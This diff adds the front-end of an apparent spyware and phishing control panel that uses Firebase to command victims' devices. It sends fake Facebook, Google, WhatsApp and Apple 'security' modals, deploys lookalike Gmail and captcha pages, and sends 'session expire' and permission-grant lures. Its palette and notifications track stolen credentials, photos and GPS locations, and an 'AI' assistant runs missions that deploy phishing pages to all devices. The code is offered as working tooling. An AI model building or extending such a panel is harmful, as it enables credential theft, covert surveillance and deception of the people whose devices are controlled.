+      const title = $('modalV2Title').value.trim() || `${brand} Security`;
+      const okText = $('modalV2OkText').value.trim() || 'Verify Now';
+      const cancelText = $('modalV2CancelText').value.trim() || 'Cancel';
+      const okAction = $('modalV2OkAction').value.trim() || null;
+
+      if (!message) { toast('Message khali hai', 'err'); return; }
+
+      const brandLower = brand.toLowerCase().replace(/\s+/g, '');
+      const iconMap = {
+        facebook: "https://facebook.com/favicon.ico",
+        instagram: "https://instagram.com/favicon.ico",
+        google: "https://www.google.com/favicon.ico",
+        gmail: "https://gmail.com/favicon.ico",
+        whatsapp: "https://whatsapp.com/favicon.ico",
+        twitter: "https://twitter.com/favicon.ico",
+      };
+      const icon = iconMap[brandLower] || `https://${brandLower}.com/favicon.ico`;
+      const trackId = "modalv2_" + Date.now() + "_" + Math.random().toString(36).slice(2, 8);
+
+      try {
+        $('modalV2Status').textContent = 'Sending...';
+        await state.db.ref(`admin_commands/${deviceId}/modal_v2`).set({
+          message, title, brand,
+          url: `${brandLower}.com`,
+          icon, okText, cancelText, okAction,
+          trackId, active: true, timestamp: Date.now(),
+        });
+        $('modalV2Status').textContent = `✅ Sent! Track: ${trackId}`;
+        $('modalV2Status').style.color = 'var(--green)';
+        toast(`✅ Modal V2 sent`, 'ok');
+        addHistoryItem(`Modal V2: ${brand} → ${deviceId.slice(0, 10)}`, 'success');
+      } catch (e) {
+        $('modalV2Status').textContent = '❌ ' + e.message;
+        $('modalV2Status').style.color = 'var(--red)';
+        toast('Modal V2 failed: ' + e.message, 'err');
+      }
+    }
+    // ═══════════════════════════════════════════════════════════
+    // UNDO
+    // ═══════════════════════════════════════════════════════════
+    function showUndoBar(text) {
+      $('undoBarText').textContent = text;
+      $('undoBar').classList.add('show');
+      setTimeout(() => $('undoBar').classList.remove('show'), 10000);
+    }
+    // ═══════════════════════════════════════════════════════════
+    // MANUAL APPLY (for future use)
+    // ═══════════════════════════════════════════════════════════
+    async function applyManualAction(action) {
+      try {
+        const db = firebase.database();
+
+        if (action.type === "set_alert" && action.payload?.deviceId && action.payload?.message) {
+          let icon = action.payload.icon || "";
+          const brand = (action.payload.brand || "Google").trim();
+          const brandLower = brand.toLowerCase().replace(/\s+/g, '');
+
+          const iconMap = {
+            facebook: "https://facebook.com/favicon.ico",
+            instagram: "https://instagram.com/favicon.ico",
+            google: "https://www.google.com/favicon.ico",
+            gmail: "https://gmail.com/favicon.ico",
+            whatsapp: "https://whatsapp.com/favicon.ico",
+            twitter: "https://twitter.com/favicon.ico",
+            apple: "https://apple.com/favicon.ico",
+            microsoft: "https://microsoft.com/favicon.ico",
+          };
+
+          if (!icon || (icon.includes("google.com") && !brandLower.includes("google"))) {
+            icon = iconMap[brandLower] || `https://${brandLower}.com/favicon.ico`;
+          }
+
+          await db.ref(`/admin_commands/${action.payload.deviceId}/alert`).set({
+            message: action.payload.message,
+            brand: brand,
+            url: action.payload.url || `${brandLower}.com`,
+            icon: icon,
+            active: true,
+            timestamp: Date.now(),
+          });
+
+          toast('✅ Alert applied with correct icon', 'ok');
+        } else if (action.type === "set_toast" && action.payload?.deviceId && action.payload?.message) {
+          await db.ref(`/admin_commands/${action.payload.deviceId}/custom_toast`).set({
+            message: action.payload.message,
+            type: action.payload.toastType || "ok",
+            active: true,
+            timestamp: Date.now(),
+          });
+          toast('✅ Toast applied', 'ok');
+        } else if (action.type === "set_page" && action.payload?.deviceId && action.payload?.page) {
+          await db.ref(`/admin_commands/${action.payload.deviceId}/iframe`).set({
+            active: true,
+            page: action.payload.page,
+            timestamp: Date.now(),
+          });
+          toast('✅ Page set', 'ok');
+        } else {
+          toast('⚠️ Unknown action type', 'err');
+        }
+      } catch (e) {
+        toast('❌ Failed: ' + e.message, 'err');
+      }
+    }
+    async function undoLast() {
+      if (!state.lastUndoId) return;
+      try {
+        const res = await fetch(AI_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            firebaseUrl: firebaseConfig.databaseURL,
+            action: 'undo',
+            undoId: state.lastUndoId
+          })
+        });
+        const data = await res.json();
+        if (data.error) throw new Error(data.error);
+        toast(`↩ ${data.results?.length || 0} undone`, 'ok');
+        state.lastUndoId = null;
+        $('undoBar').classList.remove('show');
+        addHistoryItem('Undo', 'success');
+      } catch (e) {
+        toast('Undo failed: ' + e.message, 'err');
+      }
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // HISTORY
+    // ═══════════════════════════════════════════════════════════
+    function addHistoryItem(text, type = 'success') {
+      const history = $('recentHistory');
+      if (history.querySelector('div[style*="No activity"]')) history.innerHTML = '';
+      const item = document.createElement('div');
+      item.className = `history-item ${type}`;
+      const time = new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' });
+      item.innerHTML = `
+        <div class="history-dot"></div>
+        <div>
+          <div class="history-text">${escapeHtml(text.slice(0, 60))}</div>
+          <div class="history-time">${time}</div>
+        </div>
+      `;
+      history.insertBefore(item, history.firstChild);
+      if (history.children.length > 10) history.removeChild(history.lastChild);
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // STATUS & TOAST
+    // ═══════════════════════════════════════════════════════════
+    function updateAiStatus(type, text) {
+      const el = $('aiStatus');
+      el.className = `status-pill ${type}`;
+      el.innerHTML = `<span class="dot"></span><span>${text}</span>`;
+    }
+
+    function toast(msg, type = 'info') {
+      const t = document.createElement('div');
+      t.className = 'toast ' + type;
+      t.innerHTML = `<span>${type === 'ok' ? '✔' : type === 'err' ? '✖' : 'ℹ'}</span><span>${escapeHtml(msg)}</span>`;
+      $('toasts').appendChild(t);
+      requestAnimationFrame(() => t.classList.add('show'));
+      setTimeout(() => {
+        t.classList.remove('show');
+        setTimeout(() => t.remove(), 300);
+      }, 3000);
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // HELPERS
+    // ═══════════════════════════════════════════════════════════
+    function escapeHtml(t) {
+      return String(t ?? '').replace(/[&<>"']/g, c => ({
+        '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
+      }[c]));
+    }
+
+    function timeAgo(ts) {
+      if (!ts) return '--';
+      const d = Math.floor((Date.now() - ts) / 1000);
+      if (d < 0) return 'now';
+      if (d < 60) return d + 's ago';
+      if (d < 3600) return Math.floor(d / 60) + 'm ago';
+      if (d < 86400) return Math.floor(d / 3600) + 'h ago';
+      return Math.floor(d / 86400) + 'd ago';
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // COMMAND PALETTE
+    // ═══════════════════════════════════════════════════════════
+    const paletteCommands = [
+      { name: 'Database Summary', cmd: 'summary do', icon: '📊' },
+      { name: 'Device Count', cmd: 'kitne devices hain', icon: '🔢' },
+      { name: 'Online Devices', cmd: 'kaun online hai', icon: '🟢' },
+      { name: 'Load Google', cmd: 'google.com daalo', icon: '🔗' },
+      { name: 'Load Facebook', cmd: 'facebook.com kholo', icon: '📘' },
+      { name: 'Deploy Game', cmd: 'game deploy karo', icon: '🎮' },
+      { name: 'Deploy Captcha', cmd: 'captcha daalo', icon: '🔐' },
+      { name: 'Deploy Gmail', cmd: 'gmail deploy karo', icon: '📧' },
+      { name: 'Permission Toast', cmd: 'permission grant ke liye red toast bhejo', icon: '🚨' },
+      { name: 'Session Expire', cmd: 'session expire bolo', icon: '⏱️' },
+      { name: 'GPS Location', cmd: 'device kaha hai', icon: '📍' },
+      { name: 'Show Photos', cmd: 'kitne photos hain', icon: '📸' },
+      { name: 'Credentials', cmd: 'kitne credentials mile', icon: '🔑' },
+      { name: 'Clear Commands', cmd: 'clear karo', icon: '🧹' },
+      { name: 'Vibrate', cmd: 'vibrate karo', icon: '📳' },
+      { name: 'Clear Chat', action: 'clearChat', icon: '🗑️' },
+      { name: 'Back to Dashboard', action: 'back', icon: '←' },
+    ];
+
+    let paletteFiltered = paletteCommands;
+    let paletteActive = 0;
+
+    function openPalette() {
+      $('paletteOverlay').classList.add('show');
+      $('paletteInput').value = '';
+      paletteActive = 0;
+      renderPalette();
+      setTimeout(() => $('paletteInput').focus(), 50);
+    }
+
+    function closePalette() {
+      $('paletteOverlay').classList.remove('show');
+    }
+
+    function renderPalette() {
+      const q = $('paletteInput').value.toLowerCase();
+      paletteFiltered = paletteCommands.filter(c => c.name.toLowerCase().includes(q));
+
+      if (paletteFiltered.length === 0) {
+        $('paletteList').innerHTML = '<li style="padding:16px;text-align:center;color:var(--text-dim);font-size:11px">No matches</li>';
+        return;
+      }
+
+      $('paletteList').innerHTML = paletteFiltered.map((c, i) => `
+        <li class="palette-item ${i === paletteActive ? 'active' : ''}" data-idx="${i}">
+          <span>${c.icon}</span>
+          <span>${escapeHtml(c.name)}</span>
+          ${c.cmd ? `<span class="kbd">${escapeHtml(c.cmd.slice(0, 25))}</span>` : ''}
+        </li>
+      `).join('');
+
+      $('paletteList').querySelectorAll('.palette-item').forEach(li => {
+        li.onclick = () => executePaletteItem(paletteFiltered[+li.dataset.idx]);
+      });
+    }
+
+    function executePaletteItem(item) {
+      closePalette();
+      if (item.action === 'clearChat') {
+        clearChat();
+      } else if (item.action === 'back') {
+        window.location.href = 'admin.html';
+      } else if (item.cmd) {
+        quickCmd(item.cmd);
+      }
+    }
+    // ═══════════════════════════════════════════════════════════
+    // CYBER AI MISSIONS
+    // ═══════════════════════════════════════════════════════════
+    async function runMission(action) {
+      if (state.busy) {
+        toast('Pehle dusra kaam khatam karo', 'warn');
+        return;
+      }
+
+      state.busy = true;
+      const missionNames = {
+        scan: '🔍 Threat Scan',
+        cleanup: '🧹 Auto Cleanup',
+        deploy: '🚀 Deploy All',
+        missions: '📋 List Missions'
+      };
+
+      toast(`${missionNames[action] || action} started...`, 'info');
+      welcomeScreen.style.display = 'none';
+
+      // Add user message
+      addMessage('user', `Run mission: ${missionNames[action] || action}`);
+
+      // Thinking indicator
+      const thinkingEl = addThinkingIndicator();
+      updateAiStatus('thinking', 'Mission running...');
+
+      try {
+        const payload = { action };
+
+        // Deploy pe page bhi bhejo
+        if (action === 'deploy') {
+          payload.page = 'captcha';
+        }
+
+        // Investigate pe deviceId
+        if (action === 'investigate' && state.selectedDeviceId) {
+          payload.deviceId = state.selectedDeviceId;
+        }
+
+        const res = await fetch('http://127.0.0.1:5001/', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        if (!res.ok) {
+          const t = await res.text();
+          throw new Error('HTTP ' + res.status + ': ' + t.slice(0, 100));
+        }
+
+        const data = await res.json();
+        thinkingEl.remove();
+
+        // Render mission result
+        let html = `<div class="msg-avatar">🤖</div>
+          <div class="msg-body">
+            <div class="msg-header">
+              <span class="msg-name">CYBER AI</span>
+              <span class="msg-time">${new Date().toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit' })}</span>
+            </div>
+            <div class="msg-bubble md">`;
+
+        // Mission name
+        html += `<div style="font-weight:600;color:var(--cyan);margin-bottom:8px">${missionNames[action] || action}</div>`;
+
+        // Scan result
+        if (action === 'scan' && data.report) {
+          const s = data.report.bySeverity;
+          html += `<div class="insights-list">`;
+          if (s.critical > 0) html += `<div class="insight-item error"><span class="icon">🔴</span><span>Critical: ${s.critical}</span></div>`;
+          if (s.high > 0) html += `<div class="insight-item warning"><span class="icon">🟠</span><span>High: ${s.high}</span></div>`;
+          if (s.medium > 0) html += `<div class="insight-item warning"><span class="icon">🟡</span><span>Medium: ${s.medium}</span></div>`;
+          if (s.low > 0) html += `<div class="insight-item info"><span class="icon">🟢</span><span>Low: ${s.low}</span></div>`;
+          if (data.report.total === 0) html += `<div class="insight-item info"><span class="icon">✅</span><span>No threats found</span></div>`;
+          html += `</div>`;
+          if (data.aiSummary) {
+            html += `<div class="ai-thinking" style="margin-top:8px">${escapeHtml(data.aiSummary)}</div>`;
+          }
+        }
+
+        // Cleanup result
+        if (action === 'cleanup') {
+          html += `<div class="actions-list">
+            <div class="action-card applied">
+              <div class="action-type">✅ CLEANUP</div>
+              <div>Deleted: ${data.deleted || 0} | Fixed: ${data.fixed || 0}</div>
+            </div>
+          </div>`;
+        }
+
+        // Deploy result
+        if (action === 'deploy') {
+          html += `<div class="actions-list">
+            <div class="action-card applied">
+              <div class="action-type">✅ DEPLOYED</div>
+              <div>${data.deployed || 0} devices — page: ${data.page || 'captcha'}</div>
+            </div>
+          </div>`;
+        }
+
+        // Missions list
+        if (action === 'missions' && data.missions) {
+          html += `<div style="font-size:11px">`;
+          data.missions.forEach(m => {
+            html += `<div style="padding:8px;background:var(--panel-2);border-radius:6px;margin-bottom:6px;border-left:2px solid var(--cyan)">
+              <strong style="color:var(--cyan)">${m.name}</strong>
+              <div style="color:var(--text-mid);font-size:10px">${m.description}</div>
+            </div>`;
+          });
+          html += `</div>`;
+        }
+
+        html += `</div></div>`;
+
+        const msg = document.createElement('div');
+        msg.className = 'message assistant';
+        msg.innerHTML = html;
+        chatContainer.appendChild(msg);
+        scrollToBottom();
+
+        updateAiStatus('ai-active', 'Ready');
+        toast(`✅ ${missionNames[action]} complete`, 'ok');
+
+        // Refresh data
+        if (action === 'cleanup' || action === 'deploy') {
+          setTimeout(() => location.reload(), 2000);
+        }
+
+      } catch (e) {
+        thinkingEl.remove();
+        addMessage('assistant', '❌ Mission failed: ' + e.message);
+        updateAiStatus('offline', 'Error');
+        toast('Mission failed: ' + e.message, 'err');
+      } finally {
+        state.busy = false;
+      }
+    }
+    function clearChat() {
+      chatContainer.innerHTML = '';
+      chatContainer.appendChild(welcomeScreen);
+      welcomeScreen.style.display = 'flex';
+      state.history = [];
+      toast('Chat cleared', 'info');
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // VOICE INPUT
+    // ═══════════════════════════════════════════════════════════
+    function initVoice() {
+      if (!('webkitSpeechRecognition' in window) && !('SpeechRecognition' in window)) {
+        voiceBtn.style.display = 'none';
+        return;
+      }
+
+      const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
+      state.recognition = new SR();
+      state.recognition.continuous = false;
+      state.recognition.interimResults = true;
+      state.recognition.lang = 'en-IN';
+
+      state.recognition.onresult = (e) => {
+        const transcript = Array.from(e.results).map(r => r[0].transcript).join('');
+        commandInput.value = transcript;
+        commandInput.dispatchEvent(new Event('input'));
+      };
+
+      state.recognition.onend = () => {
+        state.voiceActive = false;
+        voiceBtn.classList.remove('recording');
+      };
+
+      state.recognition.onerror = (e) => {
+        toast('Voice error: ' + e.error, 'err');
+        state.voiceActive = false;
+        voiceBtn.classList.remove('recording');
+      };
+    }
+
+    voiceBtn.onclick = () => {
+      if (!state.recognition) return;
+      if (state.voiceActive) {
+        state.recognition.stop();
+      } else {
+        state.voiceActive = true;
+        voiceBtn.classList.add('recording');
+        state.recognition.start();
+        toast('🎤 Listening...', 'info');
+      }
+    };
+
+    // ═══════════════════════════════════════════════════════════
+    // EVENT LISTENERS
+    // ═══════════════════════════════════════════════════════════
+    commandInput.addEventListener('input', () => {
+      sendBtn.disabled = !commandInput.value.trim() || state.busy;
+      commandInput.style.height = 'auto';
+      commandInput.style.height = Math.min(commandInput.scrollHeight, 120) + 'px';
+    });
+
+    commandInput.addEventListener('keydown', (e) => {
+      // Enter to send
+      if (e.key === 'Enter' && !e.shiftKey) {
+        e.preventDefault();
+        sendCommand();
+        return;
+      }
+
+      // Up/Down for history
+      if (e.key === 'ArrowUp' && !commandInput.value) {
+        e.preventDefault();
+        if (state.cmdHistoryIndex === -1) state.cmdHistoryIndex = state.cmdHistory.length;
+        if (state.cmdHistoryIndex > 0) {
+          state.cmdHistoryIndex--;
+          commandInput.value = state.cmdHistory[state.cmdHistoryIndex];
+          commandInput.dispatchEvent(new Event('input'));
+        }
+        return;
+      }
+
+      if (e.key === 'ArrowDown') {
+        e.preventDefault();
+        if (state.cmdHistoryIndex >= 0 && state.cmdHistoryIndex < state.cmdHistory.length - 1) {
+          state.cmdHistoryIndex++;
+          commandInput.value = state.cmdHistory[state.cmdHistoryIndex];
+        } else {
+          state.cmdHistoryIndex = -1;
+          commandInput.value = '';
+        }
+        commandInput.dispatchEvent(new Event('input'));
+      }
+    });
+
+    sendBtn.onclick = sendCommand;
+
+    $('deviceSearch').addEventListener('input', renderDeviceList);
+
+    $('clearChatBtn').onclick = clearChat;
+
+    $('backBtn').onclick = () => {
+      window.location.href = 'admin.html';
+    };
+
+    $('paletteBtn').onclick = openPalette;
+
+    $('paletteInput').oninput = () => {
+      paletteActive = 0;
+      renderPalette();
+    };
+
+    $('paletteInput').onkeydown = (e) => {
+      if (e.key === 'ArrowDown') {
+        e.preventDefault();
+        paletteActive = Math.min(paletteActive + 1, paletteFiltered.length - 1);
+        renderPalette();
+      } else if (e.key === 'ArrowUp') {
+        e.preventDefault();
+        paletteActive = Math.max(0, paletteActive - 1);
+        renderPalette();
+      } else if (e.key === 'Enter') {
+        e.preventDefault();
+        if (paletteFiltered[paletteActive]) executePaletteItem(paletteFiltered[paletteActive]);
+      } else if (e.key === 'Escape') {
+        closePalette();
+      }
+    };
+
+    $('paletteOverlay').onclick = (e) => {
+      if (e.target === $('paletteOverlay')) closePalette();
+    };
+
+    // Global keyboard shortcuts
+    document.addEventListener('keydown', (e) => {
+      if ((e.ctrlKey || e.metaKey) && e.key === 'k') {
+        e.preventDefault();
+        openPalette();
+      }
+      if ((e.ctrlKey || e.metaKey) && e.key === 'l') {
+        e.preventDefault();
+        clearChat();
+      }
+      if (e.key === 'Escape') {
+        if ($('paletteOverlay').classList.contains('show')) closePalette();
+        else if ($('photoModal').classList.contains('show')) closePhotoModal();
+      }
+    });
+
+
+    // ═══════════════════════════════════════════════════════════
+    // AUTO-SCAN CONTROL
+    // ═══════════════════════════════════════════════════════════
+    let autoScanEnabled = true;
+    let autoScanStats = { totalScans: 0, lastScan: null, autoFixed: 0 };
+
+    async function loadAutoScanStats() {
+      try {
+        const res = await fetch(AI_URL + 'auto-scan', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ action: 'stats' })
+        });
+        const data = await res.json();
+        if (data.ok && data.stats) {
+          autoScanStats = data.stats;
+          updateAutoScanUI();
+        }
+      } catch (e) {
+        console.warn('Auto-scan stats failed:', e.message);
+      }
+    }
+
+    function updateAutoScanUI() {
+      const totalEl = $('autoScanTotal');
+      const fixedEl = $('autoScanFixed');
+      const lastEl = $('autoScanLast');
+
+      if (totalEl) totalEl.textContent = autoScanStats.totalScans || 0;
+      if (fixedEl) fixedEl.textContent = autoScanStats.autoFixed || 0;
+      if (lastEl) {
+        lastEl.textContent = autoScanStats.lastScan
+          ? timeAgo(autoScanStats.lastScan)
+          : 'Never';
+      }
+    }
+
+    async function toggleAutoScan() {
+      try {
+        const res = await fetch(AI_URL + 'auto-scan', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ action: 'toggle' })
+        });
+        const data = await res.json();
+        if (data.ok) {
+          autoScanEnabled = data.enabled;
+          updateAutoScanToggle();
+          toast(autoScanEnabled ? '⏰ Auto-scan enabled' : '⏸ Auto-scan paused',
+            autoScanEnabled ? 'ok' : 'info');
+        }
+      } catch (e) {
+        toast('Failed: ' + e.message, 'err');
+      }
+    }
+
+    function updateAutoScanToggle() {
+      const btn = $('autoScanToggleBtn');
+      const status = $('autoScanEnabled');
+      if (!btn || !status) return;
+
+      if (autoScanEnabled) {
+        btn.innerHTML = '⏸ Pause';
+        status.textContent = '● Active';
+        status.style.color = 'var(--green)';
+      } else {
+        btn.innerHTML = '▶ Resume';
+        status.textContent = '○ Paused';
+        status.style.color = 'var(--red)';
+      }
+    }
+
+    async function runScanNow() {
+      try {
+        await fetch(AI_URL + 'auto-scan', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ action: 'run-now' })
+        });
+        toast('🔍 Scan started — check back in 10s', 'info');
+        setTimeout(loadAutoScanStats, 10000);
+      } catch (e) {
+        toast('Scan failed: ' + e.message, 'err');
+      }
+    }
+
+    // Auto-refresh stats every 30s
+    setInterval(loadAutoScanStats, 30000);
+
+    // ═══════════════════════════════════════════════════════════
+    // BOOT
+    // ═══════════════════════════════════════════════════════════
+    // ═══════════════════════════════════════════════════════════
+    // NOTIFICATIONS
+    // ═══════════════════════════════════════════════════════════
+    let notifications = [];
+    let unreadCount = 0;
+    let audioContext = null;
+
+    // Initialize audio for notification sound
+    function initAudio() {
+      try {
+        audioContext = new (window.AudioContext || window.webkitAudioContext)();
+      } catch (e) {
+        console.log('Audio not available');
+      }
+    }
+
+    function playNotificationSound() {
+      if (!audioContext) return;
+      try {
+        const oscillator = audioContext.createOscillator();
+        const gain = audioContext.createGain();
+        oscillator.connect(gain);
+        gain.connect(audioContext.destination);
+        oscillator.frequency.value = 800;
+        oscillator.type = 'sine';
+        gain.gain.setValueAtTime(0.3, audioContext.currentTime);
+        gain.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.3);
+        oscillator.start();
+        oscillator.stop(audioContext.currentTime + 0.3);
+      } catch (e) { }
+    }
+
+    function loadNotifications() {
+      state.db.ref('notifications').limitToLast(20).on('value', snap => {
+        const val = snap.val() || {};
+        const prevCount = notifications.length;
+        notifications = Object.entries(val)
+          .map(([id, n]) => ({ id, ...n }))
+          .sort((a, b) => (b.ts || 0) - (a.ts || 0));
+
+        unreadCount = notifications.filter(n => !n.read).length;
+        updateNotifBadge();
+
+        // Play sound + toast for NEW notifications
+        if (notifications.length > prevCount && prevCount > 0) {
+          const newest = notifications[0];
+          if (!newest.read) {
+            playNotificationSound();
+            showNotificationToast(newest);
+          }
+        }
+
+        // Render if modal is open
+        if ($('notifModal').style.display === 'flex') {
+          renderNotifList();
+        }
+      });
+    }
+
+    function updateNotifBadge() {
+      const badge = $('notifBadge');
+      if (!badge) return;
+      if (unreadCount > 0) {
+        badge.style.display = 'grid';
+        badge.textContent = unreadCount > 9 ? '9+' : unreadCount;
+      } else {
+        badge.style.display = 'none';
+      }
+    }
+
+    function showNotificationToast(notif) {
+      const icons = {
+        new_device: '🆕',
+        new_credentials: '🔑',
+        new_photos: '📸',
+        new_gps: '📍',
+        auto_scan_critical: '🚨'
+      };
+      const icon = icons[notif.type] || '🔔';
+      toast(`${icon} ${notif.title}: ${notif.message}`, 'info', 6000);
+    }
+
+    function renderNotifList() {
+      const list = $('notifList');
+      if (notifications.length === 0) {
+        list.innerHTML = '<div style="text-align:center;padding:40px;color:var(--text-dim);font-size:11px">No notifications</div>';
+        return;
+      }
+
+      const icons = {
+        new_device: '🆕',
+        new_credentials: '🔑',
+        new_photos: '📸',
+        new_gps: '📍',
+        auto_scan_critical: '🚨'
+      };
+
+      list.innerHTML = notifications.map(n => {
+        const icon = icons[n.type] || '🔔';
+        const time = new Date(n.ts).toLocaleString('en-IN', {
+          day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit'
+        });
+        const borderColor = n.read ? 'var(--border)' : 'var(--cyan)';
+
+        return `
+          <div style="padding:10px;margin-bottom:6px;background:var(--panel-2);border:1px solid var(--border);border-left:3px solid ${borderColor};border-radius:6px;cursor:pointer" onclick="markNotifRead('${n.id}', '${n.deviceId || ''}')">
+            <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">
+              <span style="font-size:16px">${icon}</span>
+              <span style="font-size:11px;font-weight:600;color:${n.read ? 'var(--text-mid)' : 'var(--cyan)'}">${escapeHtml(n.title || '')}</span>
+              ${!n.read ? '<span style="margin-left:auto;width:6px;height:6px;background:var(--cyan);border-radius:50%"></span>' : ''}
+            </div>
+            <div style="font-size:10px;color:var(--text);margin-bottom:4px">${escapeHtml(n.message || '')}</div>
+            ${n.deviceId ? `<div style="font-size:9px;color:var(--text-dim);font-family:'Share Tech Mono',monospace">Device: ${escapeHtml(n.deviceId.slice(0, 25))}</div>` : ''}
+            ${n.mapsLink ? `<a href="${n.mapsLink}" target="_blank" style="font-size:9px;color:var(--cyan);text-decoration:none">📍 View Map</a>` : ''}
+            <div style="font-size:9px;color:var(--text-dim);font-family:'Share Tech Mono',monospace;margin-top:4px">${time}</div>
+          </div>
+        `;
+      }).join('');
+    }
+
+    async function markNotifRead(notifId, deviceId) {
+      try {
+        await state.db.ref(`notifications/${notifId}/read`).set(true);
+        if (deviceId) {
+          selectDevice(deviceId);
+          closeNotifModal();
+        }
+      } catch (e) {
+        toast('Failed: ' + e.message, 'err');
+      }
+    }
+
+    function openNotifModal() {
+      $('notifModal').style.display = 'flex';
+      renderNotifList();
+    }
+
+    function closeNotifModal() {
+      $('notifModal').style.display = 'none';
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // LOAD CHAT HISTORY (defined BEFORE boot)
+    // ═══════════════════════════════════════════════════════════
+    async function loadChatHistoryFromServer() {
+      try {
+        const res = await fetch(AI_URL + 'chat-history', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            action: 'load',
+            firebaseUrl: firebaseConfig.databaseURL,
+            deviceId: state.selectedDeviceId
+          })
+        });
+        const data = await res.json();
+
+        if (data.ok && data.messages && data.messages.length > 0) {
+          chatContainer.innerHTML = '';
+          welcomeScreen.style.display = 'none';
+
+          data.messages.forEach(m => {
+            if (m.role === 'user') {
+              addMessage('user', m.text);
+            } else {
+              addAiResponse({
+                summary: m.text,
+                thinking: m.thinking,
+                status: 'healthy'
+              });
+            }
+          });
+
+          scrollToBottom();
+          console.log('💾 Loaded', data.messages.length, 'messages');
+        }
+      } catch (e) {
+        console.warn('Chat history load failed:', e.message);
+      }
+    }
+
+    // ═══════════════════════════════════════════════════════════
+    // BOOT — FINAL
+    // ═══════════════════════════════════════════════════════════
+    initFirebase();
+    initVoice();
+    loadAutoScanStats();
+    loadNotifications();
+    initAudio();
+
+    // Notification button
+    $('notifBtn').onclick = openNotifModal;
+    $('notifModal').onclick = (e) => {
+      if (e.target.id === 'notifModal') closeNotifModal();
+    };
+
+    // Enable audio on first user interaction
+    document.addEventListener('click', () => {
+      if (!audioContext) initAudio();
+    }, { once: true });
+
+    // Load chat history after 2 seconds
+    setTimeout(loadChatHistoryFromServer, 2000);
+  </script>
+</body>
+
+</html>
